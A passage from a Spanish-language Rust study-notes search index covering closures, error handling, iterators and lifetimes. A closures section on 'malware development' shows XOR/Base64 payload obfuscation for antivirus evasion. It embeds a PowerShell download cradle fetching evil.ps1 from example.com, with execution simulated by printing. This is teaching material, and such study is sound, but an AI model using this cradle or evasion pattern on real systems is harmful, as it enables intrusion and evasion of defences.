</ul>"},{"location":"OSCP/xxe/#xxe-automatizado","title":"XXE automatizado","text":""},{"location":"Rust/closures-rust/","title":"Closures en Rust","text":""},{"location":"Rust/closures-rust/#1-que-es-una-closure","title":"1. \u00bfQu\u00e9 es una closure?","text":"<p>Una closure es una funci\u00f3n an\u00f3nima que puede capturar variables de su entorno. Sintaxis b\u00e1sica:</p> <pre><code>|parametros| -&gt; TipoRetorno { cuerpo }\n</code></pre>"},{"location":"Rust/closures-rust/#ejemplos","title":"Ejemplos","text":"<pre><code>|n| n * 2                  // inferencia de tipo\n|x: f32| -&gt; f32 { x + 1.0 } // con tipos expl\u00edcitos\n|| println!(\"sin args\")     // sin par\u00e1metros\n</code></pre>"},{"location":"Rust/closures-rust/#2-captura-de-variables","title":"2. Captura de variables","text":"<p>Las closures pueden capturar variables del entorno donde se definen.</p> <p>Las closures pueden capturar de tres formas:</p> Modo de captura Trait Cu\u00e1ndo ocurre Referencia inmutable Fn Solo lectura Referencia mutable FnMut Modifica variables capturadas Por valor (mueve datos) FnOnce Consume variables capturadas (con move)"},{"location":"Rust/closures-rust/#por-ejemplo","title":"Por ejemplo","text":"<pre><code>// Fn: solo lectura\nlet max_value = 5;\nlet clamp = |v| v.min(max_value); // captura max_value por referencia inmutable\n\n// FnMut: muta estado\nlet mut sum = 0;\nlet mut add_to_sum = |x| sum += x;\n\n// FnOnce: consume\nlet data = vec![1, 2, 3];\nlet consume_data = move || {\n    println!(\"{:?}\", data);\n}; // Lo que ocurre ac\u00e1 es que se mueve el vector `data` dentro de la closure haciendo que no se pueda usar fuera de ella.\n</code></pre>"},{"location":"Rust/closures-rust/#3-utilizacion-de-move","title":"3. utilizaci\u00f3n de move","text":"<p>Forza la captura por valor, moviendo la propiedad de las variables a la closure.</p> <p>\u00datil para: - Threads <code>(thread::spawn)</code> - Evitar problemas de lifetime - Asegurar que la closure tenga su propia copia de datos - Evitar referencias a variables externas - Entre mil cositas m\u00e1s.</p>"},{"location":"Rust/closures-rust/#ejemplo-mover-propiedad-a-un-hilo","title":"Ejemplo: mover propiedad a un hilo","text":"<p><code>move</code> transfiere la propiedad de las variables capturadas a la closure, lo cual es necesario al usar <code>thread::spawn</code> porque el hilo puede vivir m\u00e1s que el stack local.</p> <p>Puntos clave - <code>move</code> captura por valor; los datos deben ser <code>Send</code> (y a menudo <code>'static</code>). - Tras el <code>move</code> la variable original ya no es usable en el hilo llamador. - Para compartir estado entre hilos usa <code>Arc&lt;Mutex&lt;T&gt;&gt;</code>. - Llama a <code>join()</code> en el <code>JoinHandle</code> para esperar y manejar errores.</p> <p>Ejemplo:</p> <pre><code>use std::thread;\n\nlet payload = vec![0x90, 0x90, 0xCC]; // NOP NOP INT3\nthread::spawn(move || {\n    // aqu\u00ed payload es propiedad de la closure\n    println!(\"Payload size: {}\", payload.len());\n}).join().unwrap(); // join y unwrap hacen espera y manejo de errores\n</code></pre>"},{"location":"Rust/closures-rust/#4-jerarquia-de-traits","title":"4. Jerarquia de traits","text":"<ul> <li>Los traits son interfaces que definen comportamientos.</li> <li>Las closures implementan los traits <code>Fn</code>, <code>FnMut</code> y <code>FnOnce</code></li> <li>Fn es el m\u00e1s flexible: se puede usar donde pidan cualquiera de los tres.</li> <li>FnMut se puede usar donde pidan FnMut o FnOnce.</li> <li>FnOnce solo donde pidan FnOnce.</li> </ul>"},{"location":"Rust/closures-rust/#ejemplo-de-jerarquia-de-traits","title":"Ejemplo de jerarqu\u00eda de traits","text":"<pre><code>fn call_fn&lt;F: Fn()&gt;(f: F) {\n    f();\n}\n\nfn call_fn_mut&lt;F: FnMut()&gt;(mut f: F) {\n    f();\n}\n\nfn call_fn_once&lt;F: FnOnce()&gt;(f: F) {\n    f();\n}\n\n// La verdad es que esto no lo entiendo del todo bien.\n</code></pre>"},{"location":"Rust/closures-rust/#5-punteros-a-funcion-fn","title":"5 Punteros a funci\u00f3n <code>fn</code>","text":"<p>Si una closure no captura nada, puede convertirse en un puntero de funci\u00f3n</p> <pre><code>let add1 = |x: i32| x + 1; \nlet f: fn(i32) -&gt; i32 = add1;\n\n// Ahora `f` es un puntero a funci\u00f3n que puede ser llamado como `f(5)`\n//Entonces podemos imprimir\nprintln!(\"Resultado: {}\", f(5)); // Resultado: 6\n</code></pre>"},{"location":"Rust/closures-rust/#otro-ejemplo-de-puntero-a-funcion-mas-complejo","title":"Otro ejemplo de puntero a funci\u00f3n m\u00e1s complejo","text":"<p>Demostraci\u00f3n m\u00e1s \u00fatil: usar <code>apply_fn</code> con una closure que captura entorno, con una funci\u00f3n normal (puntero) y un ejemplo de hilos.</p> <p>Aplica una funci\u00f3n o clausura que toma un i32 y devuelve un i32 al valor <code>x</code>.</p> <p>Esta es una funci\u00f3n de orden superior gen\u00e9rica: recibe un par\u00e1metro de tipo <code>F</code> que implementa el trait <code>Fn(i32) -&gt; i32</code> (es decir, cualquier funci\u00f3n o clausura que acepte un <code>i32</code> y produzca un <code>i32</code>). La funci\u00f3n simplemente llama a <code>f(x)</code> y devuelve el resultado.</p> <p>Prop\u00f3sito pr\u00e1ctico: - Abstraer la operaci\u00f3n de \"aplicar\" una transformaci\u00f3n sobre un entero sin fijar   qu\u00e9 transformaci\u00f3n es. - Permitir pasar tanto funciones libres como clausuras que puedan capturar el   entorno (siempre que sean compatibles con <code>Fn</code>). - Si necesitas que la clausura pueda mutar su entorno, considera usar <code>FnMut</code>;   si la clausura se consume al invocarse, usa <code>FnOnce</code>.</p> <p>Par\u00e1metros: - <code>f</code>: la funci\u00f3n o clausura a aplicar sobre <code>x</code>. - <code>x</code>: el entero que se pasar\u00e1 a <code>f</code>.</p> <p>Retorna: - El resultado de <code>f(x)</code> como <code>i32</code>.</p> <ul> <li>Ejemplo:</li> </ul> <pre><code>fn apply_fn&lt;F: Fn(i32) -&gt; i32&gt;(f: F, x: i32) -&gt; i32 {\n    f(x)\n}\n\nfn add_one(n: i32) -&gt; i32 {\n    n + 1\n}\n\nfn main() {\n    // Closure que captura por referencia inmutable\n    let factor = 3;\n    let multiply = |n: i32| n * factor;\n\n    // Closure que muta estado externo (FnMut)\n    let mut total = 0;\n    {\n        let mut add_to_total = |n: i32| total += n;\n        add_to_total(5);\n        add_to_total(10);\n    }\n\n    println!(\"apply_fn con closure multiply: {}\", apply_fn(multiply, 4)); // 12\n    println!(\"apply_fn con funci\u00f3n add_one: {}\", apply_fn(add_one, 4)); // 5\n\n    // Ejemplo con threads: mover propiedad a la closure\n    let nums = vec![1, 2, 3];\n    let handles: Vec&lt;_&gt; = nums.into_iter().map(|n| {\n        std::thread::spawn(move || n * 2)\n    }).collect();\n\n    for h in handles {\n        println!(\"Resultado del hilo: {}\", h.join().unwrap());\n    }\n\n    println!(\"total acumulado = {}\", total);\n}\n</code></pre>"},{"location":"Rust/closures-rust/#analogia-de-abstraccion-porque-si-no-no-se-entiende-del-todo-bien","title":"Analog\u00eda de abstracci\u00f3n porque si no no se entiende del todo bien","text":""},{"location":"Rust/closures-rust/#analogia-un-ayudante-de-cocina-robotico","title":"Analog\u00eda: Un ayudante de cocina robotico","text":"<p>Imaginemos que construimos un robot de cocina llamado <code>apply_fn</code>. Su unica tarea es tomar un ingrediente <code>x</code>y aplicarle una acci\u00f3n de cocina <code>f</code> que le pasamos.</p> <pre><code>// Nuestro robot de cocina\nfn apply_fn&lt;F: Fn(i32) -&gt; i32&gt;(f: F, x: i32) -&gt; i32 {\n    // f: la acci\u00f3n de cocina (ej: cortar, fre\u00edr, mezclar)\n    // x: el ingrediente (ej: una papa, representada por un n\u00famero)\n    f(x) // El robot aplica la acci\u00f3n al ingrediente\n}\n</code></pre> <p>Ahora tenemos diferentes \"recetas\" (funciones o closures) que pueden ser pasadas al robot: - receta <code>add_one</code> (funci\u00f3n normal): \"Pelar papa\", O sea sumarle 1 al n\u00famero. - receta <code>multiply</code> (closure): \"Cortar papa en trozos de tama\u00f1o <code>factor</code>\", O sea multiplicar el n\u00famero por un factor.</p> <p>Nosotros como jefe de cocina podemos decirle al robot: - \"Agarr\u00e1 esta papa <code>4</code> y us\u00e1 la receta <code>add_one</code> para prepararla\".     - El robot hace <code>apply_fn(add_one, 4)</code> y nos devuelve <code>5</code>. - \"Robot, agarr\u00e1 esta papa <code>4</code> y us\u00e1 la receta <code>multiply</code> para prepararla\".     - El robot hace <code>apply_fn(multiply, 4)</code> y nos devuelve <code>12</code>.</p> <p>Ahora imaginemos una funci\u00f3n <code>preparar_gran_banquete</code> que: - Lava 100 papas. - Lllama al robot <code>apply_fn</code> para que haga algo con cada papa. - Hornea todas las papas.</p> <p>Ahora podemos utilizar <code>preparar_gran_banquete</code> con diferentes recetas: - papas fritas: <code>preparar_gran_banquete(cortar_en_bastones)</code> - pur\u00e9 de papas: <code>preparar_gran_banquete(pisar_papas)</code></p> <p>Entonces no hace falta reescribir los pasos de lavar y hornear, solo cambiamos la receta que le pasamos al robot.</p>"},{"location":"Rust/closures-rust/#el-poder-en-el-mundo-real-mas-alla-de-apply_fn","title":"El Poder en el Mundo Real: M\u00e1s All\u00e1 de <code>apply_fn</code>","text":"<p>Este patr\u00f3n es la base de muchos metodos que se usan constantemente en Rust, especialmente con iteradores. Si pensamos en el metodo <code>.map()</code> es exactamente como <code>apply_fn</code>, pero aplicado a cada elemento de una colecci\u00f3n.</p> <pre><code>let numeros = vec![1, 2, 3];\n\n// .map() es una funci\u00f3n de orden superior como apply_fn.\n// Le pasas una \"receta\" (la closure |n| n * 2) y la aplica a cada elemento.\nlet dobles: Vec&lt;_&gt; = numeros.iter().map(|n| n * 2).collect(); // [2, 4, 6]\n</code></pre> <p>Ac\u00e1 <code>.map()</code> est\u00e1 abstrayendo el bucle y la logica de aplicar una transformaci\u00f3n. Nosotros solo nos preocupamos por definir que transformaci\u00f3n queremos aplicar a cada elemento.</p>"},{"location":"Rust/closures-rust/#ejemplo-con-malware-development","title":"Ejemplo con malware development","text":""},{"location":"Rust/closures-rust/#payload-ofuscado","title":"Payload ofuscado","text":"<p>El objetivo principal de un malware es evitar ser detectado por los antivirus (AV) y analistas. Una t\u00e9cnica fundamental es no incluir el c\u00f3digo malicioso (shellcode, comandos, etc.) en texto plano dentro del ejecutable. En su lugar, se almacena de forma ofuscada (cifrada, codificada) y se decodifica en memoria justo antes de usarlo. Nuestra funci\u00f3n de orden superior nos permitir\u00e1 cambiar f\u00e1cilmente el algoritmo de decodificaci\u00f3n sin alterar la l\u00f3gica de ejecuci\u00f3n.</p> <p>En este ejemplo, vamos a simular la ejecuci\u00f3n. Ddecodificaremos un comando y lo imprimiremos en la consola. El principio es exactamente el mismo.</p> <pre><code>// Funci\u00f3n de orden superior para decodificar y \"ejecutar\" un payload.\n// F es el tipo gen\u00e9rico para nuestra funci\u00f3n de decodificaci\u00f3n.\n// El trait `Fn(&amp;[u8]) -&gt; Vec&lt;u8&gt;` significa que F debe ser una funci\u00f3n\n// o closure que toma un slice de bytes y devuelve un nuevo Vector de bytes.\nfn execute_decoded_payload&lt;F&gt;(encoded_payload: &amp;[u8], decoder: F)\nwhere\n    F: Fn(&amp;[u8]) -&gt; Vec&lt;u8&gt;,\n{\n    println!(\"\u2699\ufe0f Ejecutor gen\u00e9rico iniciado...\");\n\n    // 1. La funci\u00f3n 'decoder' que pasamos se invoca aqu\u00ed.\n    //    No sabemos ni nos importa si es XOR, Base64, etc. Solo la llamamos.\n    let decoded_payload = decoder(encoded_payload);\n    println!(\"\ud83d\udce6 Payload decodificado correctamente.\");\n\n    // 2. SIMULACI\u00d3N DE EJECUCI\u00d3N\n    //    En un malware real, aqu\u00ed es donde el shellcode decodificado\n    //    se copiar\u00eda a una memoria ejecutable y se llamar\u00eda.\n    //    Nosotros solo lo convertiremos a String para verlo.\n    match String::from_utf8(decoded_payload) {\n        Ok(command) =&gt; println!(\"\ud83d\ude80 EJECUTANDO COMANDO SIMULADO: '{}'\", command),\n        Err(_) =&gt; println!(\"\u274c Error: El payload decodificado no es un string UTF-8 v\u00e1lido.\"),\n    }\n    println!(\"------------------------------------\");\n}\n\n// --- Implementaciones de Algoritmos de Decodificaci\u00f3n ---\n\n// Algoritmo 1: Decodificador XOR simple\nfn xor_decode(data: &amp;[u8], key: u8) -&gt; Vec&lt;u8&gt; {\n    data.iter().map(|byte| byte ^ key).collect()\n}\n\n// Algoritmo 2: Decodificador Base64 (usando una librer\u00eda externa)\n// Para usar esto, a\u00f1ade `base64 = \"0.21\"` a tu Cargo.toml\nfn base64_decode(data: &amp;[u8]) -&gt; Vec&lt;u8&gt; {\n    use base64::{engine::general_purpose, Engine as _};\n    general_purpose::STANDARD.decode(data).unwrap_or_default()\n}\n\n\nfn main() {\n    // Nuestro comando malicioso secreto\n    let secret_command = \"powershell -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://example.com/evil.ps1')\\\"\";\n\n    // --- Preparando Payloads Ofuscados ---\n\n    // 1. Payload ofuscado con XOR y una clave secreta (0xAB)\n    let xor_key = 0xAB;\n    let xor_encoded_payload: Vec&lt;u8&gt; = secret_command.bytes().map(|b| b ^ xor_key).collect();\n    println!(\"\ud83d\udd11 Payload cifrado con XOR: {:?}\", &amp;xor_encoded_payload[..20]);\n\n\n    // 2. Payload ofuscado con Base64\n    use base64::{engine::general_purpose, Engine as _};\n    let base64_encoded_payload = general_purpose::STANDARD.encode(secret_command);\n    println!(\"\ud83d\udcdc Payload codificado en Base64: {}...\", &amp;base64_encoded_payload[..20]);\n\n    println!(\"\\n=== INICIANDO OPERACIONES ===\\n\");\n\n\n    // --- Usando nuestro ejecutor polim\u00f3rfico ---\n\n    // Ejecutamos el payload XOR. Usamos una closure para capturar la `xor_key`.\n    // La closure `|payload| xor_decode(payload, xor_key)` cumple con el trait `Fn(&amp;[u8]) -&gt; Vec&lt;u8&gt;`.\n    execute_decoded_payload(&amp;xor_encoded_payload, |payload| xor_decode(payload, xor_key));\n\n    // Ejecutamos el payload Base64. Pasamos la funci\u00f3n directamente.\n    execute_decoded_payload(base64_encoded_payload.as_bytes(), base64_decode);\n}\n</code></pre>"},{"location":"Rust/closures-rust/#okay-pero-por-que-este-patron-es-util-en-malware-development","title":"Okay pero por qu\u00e9 este patr\u00f3n es \u00fatil en malware development?","text":"<ul> <li>Polmorfismo para la evasi\u00f3n: Se puede tener 10 maneras diferentes de cifrar un payload. El c\u00f3digo principal que lo ejecuta <code>execute_decoded_payload</code> no cambia, solo la funci\u00f3n de decodificaci\u00f3n. Dandonos una flexibilidad enorme para cambiar el algoritmo de evasi\u00f3n sin reescribir la l\u00f3gica de ejecuci\u00f3n.</li> <li>Evasi\u00f3n del analisis estatico de los AV: cuando un AV mira los bytes de tu ejecutable no va a ver el string \"powershell -c ...\". Va a ver una secuencia de bytes ofuscados. Esto dificulta que los AV detecten el payload malicioso.</li> <li>Modularidad y reutilizaci\u00f3n: Puedes reutilizar <code>execute_decoded_payload</code> con diferentes algoritmos de decodificaci\u00f3n sin duplicar c\u00f3digo. Si necesitas cambiar la l\u00f3gica de ejecuci\u00f3n, solo modificas una parte.</li> </ul>"},{"location":"Rust/error-handling-rust/","title":"Error Handling en Rust","text":""},{"location":"Rust/error-handling-rust/#1-panics","title":"1. Panics","text":"<p>En Rust, los panics representan errores irrecuperables. Cuando ocurre un <code>panic!</code>, el programa finaliza abruptamente. Se utilizan en situaciones donde continuar la ejecuci\u00f3n no tendr\u00eda sentido, por ejemplo:</p> <pre><code>panic!(\"Algo sali\u00f3 mal\");\n</code></pre> <p>Es recomendable evitar <code>panic!</code> en c\u00f3digo de producci\u00f3n o librer\u00edas. En su lugar, se prefiere devolver un <code>Result</code> y manejar el error expl\u00edcitamente.</p>"},{"location":"Rust/error-handling-rust/#2-result","title":"2. Result","text":"<p><code>Result&lt;T, E&gt;</code> es un enum est\u00e1ndar que representa \u00e9xito (<code>Ok</code>) o error (<code>Err)</code>:</p> <pre><code>enum Result&lt;T, E&gt; {\n    Ok(T),\n    Err(E),\n}\n</code></pre> <p>Ejemplo:</p> <pre><code>fn divide(a: f64, b: f64) -&gt; Result&lt;f64, String&gt; {\n    if b == 0.0 {\n        Err(\"Divisi\u00f3n por cero\".into())\n    } else {\n        Ok(a / b)\n    }\n}\n</code></pre> <p>Manejar un <code>Result</code> puede hacerse con <code>match</code>, <code>if let</code> o el operador <code>?</code>.</p>"},{"location":"Rust/error-handling-rust/#3-operador-y-try","title":"3. Operador <code>?</code> y Try","text":"<p>El operador <code>?</code> simplifica la propagaci\u00f3n de errores. Expande a un <code>match</code> que devuelve autom\u00e1ticamente en caso de error.</p> <pre><code>fn read_file(path: &amp;str) -&gt; Result&lt;String, std::io::Error&gt; {\n    let mut s = String::new();\n    std::fs::File::open(path)?.read_to_string(&amp;mut s)?;\n    Ok(s)\n}\n</code></pre> <p>Expansi\u00f3n impl\u00edcita:</p> <pre><code>match std::fs::File::open(path) {\n    Ok(file) =&gt; file,\n    Err(e) =&gt; return Err(From::from(e)),\n}\n</code></pre> <p>El <code>From::from</code> convierte el tipo de error autom\u00e1ticamente si la funci\u00f3n devuelve un <code>Result</code> con otro tipo compatible.</p>"},{"location":"Rust/error-handling-rust/#4-try-conversions-from-y-map_err","title":"4. Try Conversions (<code>From</code> y <code>map_err</code>)","text":"<p>Cuando los errores tienen tipos distintos, se usa el trait <code>From</code> para definir conversiones entre ellos:</p> <pre><code>impl From&lt;io::Error&gt; for MyError {\n    fn from(err: io::Error) -&gt; MyError {\n        MyError::Io(err)\n    }\n}\n</code></pre> <p>Esto permite usar <code>?</code> sin necesidad de convertir manualmente. Alternativamente, puede usarse <code>map_err</code> para una conversi\u00f3n puntual:</p> <pre><code>fs::File::open(path).map_err(MyError::Io)?;\n</code></pre>"},{"location":"Rust/error-handling-rust/#5-trait-error","title":"5. Trait <code>Error</code>","text":"<p><code>std::error::Error</code> es un trait que define el comportamiento com\u00fan de todos los errores:</p> <pre><code>use std::error::Error;\nuse std::fmt;\n\n#[derive(Debug)]\nstruct MyError;\n\nimpl fmt::Display for MyError {\n    fn fmt(&amp;self, f: &amp;mut fmt::Formatter) -&gt; fmt::Result {\n        write!(f, \"Ocurri\u00f3 un error\")\n    }\n}\n\nimpl Error for MyError {}\n</code></pre> <p>Implementar <code>Display</code> y <code>Error</code> permite describir e integrar los errores con el sistema est\u00e1ndar.</p>"},{"location":"Rust/error-handling-rust/#6-tipos-de-error-dinamicos-boxdyn-error","title":"6. Tipos de error din\u00e1micos (<code>Box&lt;dyn Error&gt;</code>)","text":"<p>Cuando una funci\u00f3n puede devolver m\u00faltiples tipos de error, puede usarse <code>Box&lt;dyn Error&gt;</code>:</p> <pre><code>fn read_count(path: &amp;str) -&gt; Result&lt;i32, Box&lt;dyn std::error::Error&gt;&gt; {\n    let mut s = String::new();\n    std::fs::File::open(path)?.read_to_string(&amp;mut s)?;\n    let n: i32 = s.parse()?;\n    Ok(n)\n}\n</code></pre> <p>Esto permite devolver cualquier tipo de error que implemente <code>Error</code>, sin crear un <code>enum</code> espec\u00edfico. Es m\u00e1s flexible pero menos preciso (pierde el tipo est\u00e1tico del error).</p>"},{"location":"Rust/error-handling-rust/#7-crate-thiserror","title":"7. Crate <code>thiserror</code>","text":"<p>El crate <code>thiserror</code> automatiza la implementaci\u00f3n de traits como <code>From</code>, <code>Display</code> y <code>Error</code>, reduciendo el boilerplate.</p> <p>Ejemplo:</p> <pre><code>use std::io;\nuse thiserror::Error;\n\n#[derive(Debug, Error)]\nenum ReadUsernameError {\n    #[error(\"I/O error: {0}\")]\n    Io(#[from] io::Error),\n    #[error(\"Found no username in {0}\")]\n    EmptyUsername(String),\n}\n\nfn read_username(path: &amp;str) -&gt; Result&lt;String, ReadUsernameError&gt; {\n    let mut username = String::new();\n    std::fs::File::open(path)?.read_to_string(&amp;mut username)?;\n    if username.is_empty() {\n        return Err(ReadUsernameError::EmptyUsername(path.into()));\n    }\n    Ok(username)\n}\n</code></pre> <p>Ventajas: - Genera autom\u00e1ticamente las implementaciones de <code>Display</code>, <code>Error</code> y <code>From</code>. - Mejora la legibilidad y mantiene el c\u00f3digo limpio. - Ideal para definir tipos de error en aplicaciones medianas o grandes.</p>"},{"location":"Rust/error-handling-rust/#8-crate-anyhow","title":"8. Crate <code>anyhow</code>","text":"<p><code>anyhow</code> est\u00e1 dise\u00f1ado para programas (no librer\u00edas) y simplifica la gesti\u00f3n de errores al permitir devolver cualquier tipo de error con contexto adicional.</p> <pre><code>use anyhow::{Result, Context};\nuse std::fs;\n\nfn read_config() -&gt; Result&lt;String&gt; {\n    let data = fs::read_to_string(\"config.toml\")\n        .context(\"Error al leer el archivo de configuraci\u00f3n\")?;\n    Ok(data)\n}\n</code></pre> <p>Caracter\u00edsticas: - Usa <code>anyhow::Result&lt;T&gt;</code> como alias de <code>Result&lt;T, anyhow::Error&gt;</code>. - Permite agregar contexto con <code>.context(\"...\")</code>. - Adecuado para CLI o binarios donde solo se necesita mostrar un mensaje descriptivo.</p>"},{"location":"Rust/error-handling-rust/#conclusion","title":"Conclusi\u00f3n","text":"<p>Rust ofrece m\u00faltiples niveles de manejo de errores:</p> <ul> <li> <p><code>panic!</code>: errores fatales.</p> </li> <li> <p><code>Result&lt;T, E&gt;</code>: control total sobre errores recuperables.</p> </li> <li> <p><code>From</code> / <code>?</code>: simplificaci\u00f3n en la propagaci\u00f3n.</p> </li> <li> <p><code>thiserror</code>: automatiza el manejo estructurado de errores.</p> </li> <li> <p><code>anyhow</code>: simplifica el manejo din\u00e1mico en aplicaciones.</p> </li> </ul> <p>Cada enfoque tiene su lugar dependiendo del grado de control, precisi\u00f3n o conveniencia que se necesite.</p>"},{"location":"Rust/iterators-rust/","title":"\ud83e\udd80 Iteradores en Rust","text":""},{"location":"Rust/iterators-rust/#introduccion","title":"Introducci\u00f3n","text":"<p>Un iterador en Rust es un objeto que produce una secuencia de valores uno por uno. Su comportamiento est\u00e1 definido por el trait <code>Iterator</code>, y se usa ampliamente para recorrer, transformar y procesar colecciones.</p> <p>Los iteradores son perezosos (lazy): no realizan trabajo hasta que se los consume con m\u00e9todos como <code>.collect()</code>, <code>.sum()</code>, <code>.count()</code>, etc.</p>"},{"location":"Rust/iterators-rust/#trait-iterator","title":"Trait <code>Iterator</code>","text":"<pre><code>trait Iterator {\n    type Item;\n    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt;;\n}\n</code></pre> <ul> <li><code>Item</code>: tipo de elemento que el iterador produce.  </li> <li><code>next()</code>: devuelve <code>Some(valor)</code> mientras haya elementos, y <code>None</code> al terminar.</li> </ul> <p>Ejemplo:</p> <pre><code>let v = vec![1, 2, 3];\nlet mut it = v.iter();\n\nassert_eq!(it.next(), Some(&amp;1));\nassert_eq!(it.next(), Some(&amp;2));\nassert_eq!(it.next(), Some(&amp;3));\nassert_eq!(it.next(), None);\n</code></pre>"},{"location":"Rust/iterators-rust/#adaptadores-de-iteradores","title":"Adaptadores de iteradores","text":"<p>Los m\u00e9todos que devuelven nuevos iteradores se llaman adaptadores. No ejecutan nada hasta que se llega a un consumidor.</p>"},{"location":"Rust/iterators-rust/#ejemplos-comunes","title":"Ejemplos comunes:","text":"M\u00e9todo Descripci\u00f3n <code>.map(f)</code> Aplica una funci\u00f3n a cada elemento <code>.filter(pred)</code> Retiene solo los elementos que cumplan una condici\u00f3n <code>.take(n)</code> Toma los primeros <code>n</code> elementos <code>.skip(n)</code> Salta los primeros <code>n</code> elementos <code>.cycle()</code> Repite infinitamente la secuencia <code>.zip(iter2)</code> Combina dos iteradores en pares <code>(a, b)</code> <code>.enumerate()</code> Agrega \u00edndices <code>(i, valor)</code> <p>Ejemplo:</p> <pre><code>let nums = vec![1, 2, 3, 4];\nlet result: Vec&lt;_&gt; = nums.iter()\n    .filter(|x| **x % 2 == 0)\n    .map(|x| x * x)\n    .collect();\n\nassert_eq!(result, vec![4, 16]);\n</code></pre>"},{"location":"Rust/iterators-rust/#consumidores-de-iteradores","title":"Consumidores de iteradores","text":"<p>Son m\u00e9todos que consumen el iterador y devuelven un valor o colecci\u00f3n.</p> M\u00e9todo Descripci\u00f3n <code>.collect()</code> Convierte los resultados en una colecci\u00f3n (<code>Vec</code>, <code>HashMap</code>, etc.) <code>.sum()</code>, <code>.product()</code> Calculan suma o producto <code>.count()</code> Cuenta los elementos <code>.any()</code>, <code>.all()</code> Eval\u00faan condiciones <code>.find()</code>, <code>.position()</code> Buscan elementos <code>.for_each(f)</code> Ejecutan una funci\u00f3n por elemento (sin devolver nada) <p>Ejemplo:</p> <pre><code>let primes = vec![2, 3, 5, 7];\nlet squares: Vec&lt;_&gt; = primes.into_iter().map(|p| p * p).collect();\nprintln!(\"{squares:?}\"); // [4, 9, 25, 49]\n</code></pre>"},{"location":"Rust/iterators-rust/#trait-intoiterator","title":"Trait <code>IntoIterator</code>","text":"<p><code>IntoIterator</code> define c\u00f3mo obtener un iterador a partir de un tipo. Es el trait que hace funcionar los <code>for</code> loops en Rust.</p> <pre><code>trait IntoIterator {\n    type Item;\n    type IntoIter: Iterator&lt;Item = Self::Item&gt;;\n    fn into_iter(self) -&gt; Self::IntoIter;\n}\n</code></pre> <p>Ejemplo:</p> <pre><code>struct Grid {\n    x_coords: Vec&lt;u32&gt;,\n    y_coords: Vec&lt;u32&gt;,\n}\n\nstruct GridIter {\n    grid: Grid,\n    i: usize,\n    j: usize,\n}\n\nimpl Iterator for GridIter {\n    type Item = (u32, u32);\n    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt; {\n        if self.i &gt;= self.grid.x_coords.len() {\n            self.i = 0;\n            self.j += 1;\n            if self.j &gt;= self.grid.y_coords.len() {\n                return None;\n            }\n        }\n        let res = (self.grid.x_coords[self.i], self.grid.y_coords[self.j]);\n        self.i += 1;\n        Some(res)\n    }\n}\n\nimpl IntoIterator for Grid {\n    type Item = (u32, u32);\n    type IntoIter = GridIter;\n    fn into_iter(self) -&gt; GridIter {\n        GridIter { grid: self, i: 0, j: 0 }\n    }\n}\n\nfn main() {\n    let grid = Grid { x_coords: vec![1, 2], y_coords: vec![10, 20] };\n    for (x, y) in grid {\n        println!(\"({x}, {y})\");\n    }\n}\n</code></pre> <p>\ud83d\udccd Nota: <code>for</code> en Rust traduce internamente a: <pre><code>let mut iter = grid.into_iter();\nwhile let Some(item) = iter.next() { ... }\n</code></pre></p>"},{"location":"Rust/iterators-rust/#iteradores-infinitos-y-combinadores","title":"\ud83d\udd01 Iteradores infinitos y combinadores","text":"<p>Ejemplo de uso con <code>cycle()</code> y <code>skip()</code>:</p> <pre><code>fn offset_differences(offset: usize, values: Vec&lt;i32&gt;) -&gt; Vec&lt;i32&gt; {\n    let a = values.iter();\n    let b = values.iter().cycle().skip(offset);\n    a.zip(b).map(|(a, b)| *b - *a).collect()\n}\n\nfn main() {\n    let result = offset_differences(1, vec![1, 2, 3, 4]);\n    println!(\"{result:?}\"); // [1, 1, 1, -3]\n}\n</code></pre> <ul> <li><code>cycle()</code> repite infinitamente los elementos.</li> <li><code>skip(n)</code> descarta los primeros <code>n</code>.</li> <li><code>zip()</code> combina ambos iteradores.</li> <li><code>map()</code> aplica una funci\u00f3n sobre los pares.</li> <li><code>collect()</code> materializa el resultado.</li> </ul>"},{"location":"Rust/iterators-rust/#ventajas-sobre-los-ciclos-tradicionales","title":"\u26a1 Ventajas sobre los ciclos tradicionales","text":"Ventaja Descripci\u00f3n Composici\u00f3n funcional Encaden\u00e1s operaciones como un pipeline (<code>map \u2192 filter \u2192 collect</code>) Sin mutabilidad Evita variables temporales o contadores Seguridad Nunca hay riesgo de \u201c\u00edndice fuera de rango\u201d Lazy evaluation Las operaciones no se ejecutan hasta que se consumen Reutilizaci\u00f3n Pod\u00e9s combinar, extender y adaptar iteradores f\u00e1cilmente"},{"location":"Rust/iterators-rust/#referencias","title":"\ud83d\udcda Referencias","text":"<ul> <li>Comprehensive Rust \u2014 Iterators</li> <li>Rust Docs: std::iter</li> <li>Rust by Example \u2014 Iterators</li> </ul>"},{"location":"Rust/lifetimes-rust/","title":"Lifetimes en Rust","text":"<p>Las variables en rust tienen un alcance (scope) que define el tiempo de vida de la variable. Este alcance determina cu\u00e1ndo una variable es v\u00e1lida y cu\u00e1ndo deja de serlo. Los lifetimes en Rust son una forma de asegurar que las referencias a datos sean v\u00e1lidas durante el tiempo que se utilizan.</p> <p>Todo prestamo en rust tiene un lifetime asociado que indica cu\u00e1nto tiempo la referencia es v\u00e1lida. Rust utiliza lifetimes para evitar problemas comunes en la gesti\u00f3n de memoria, como referencias colgantes o uso despu\u00e9s de liberar memoria.</p> <p>En las funciones a veces es necesario especificar lifetimes expl\u00edcitamente para indicar c\u00f3mo se relacionan los lifetimes de los par\u00e1metros y el valor de retorno. Esto se hace utilizando anotaciones de lifetime, que son etiquetas que comienzan con una comilla simple (<code>'</code>).</p> <ol> <li>Cada argumento de referencia en una funci\u00f3n puede tener su propio lifetime.</li> <li>Si solo hay un argumento con lifetime, ese lifetime se asigna al valor de retorno.</li> <li>Si hay varios y el primero es &amp;self o &amp;mut self, el lifetime de self se asigna al valor de retorno.</li> </ol> <pre><code>#[derive(Debug)]\nstruct Point(i32, i32);\n\nfn cab_distance(p1: &amp;Point, p2: &amp;Point) -&gt; i32 {\n    (p1.0 - p2.0).abs() + (p1.1 - p2.1).abs()\n}\n\nfn find_nearest&lt;'a&gt;(points: &amp;'a [Point], query: &amp;Point) -&gt; Option&lt;&amp;'a Point&gt; {\n    let mut nearest = None;\n    for p in points {\n        if let Some((_, nearest_dist)) = nearest {\n            let dist = cab_distance(p, query);\n            if dist &lt; nearest_dist {\n                nearest = Some((p, dist));\n            }\n        } else {\n            nearest = Some((p, cab_distance(p, query)));\n        };\n    }\n    nearest.map(|(p, _)| p)\n}\n\nfn 